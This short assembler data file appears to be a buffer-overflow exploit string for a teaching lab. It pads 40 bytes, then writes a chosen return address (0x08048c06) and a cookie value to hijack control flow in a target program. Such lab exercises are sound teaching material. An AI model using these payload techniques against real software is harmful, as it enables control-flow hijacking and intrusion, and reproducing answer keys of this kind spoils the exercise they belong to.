COOKIE   = 0x7d97e567
RETADDR  = 0x08048c06

.fill 40, 1, 0

.long 0
.long RETADDR
.long 0
.long COOKIE
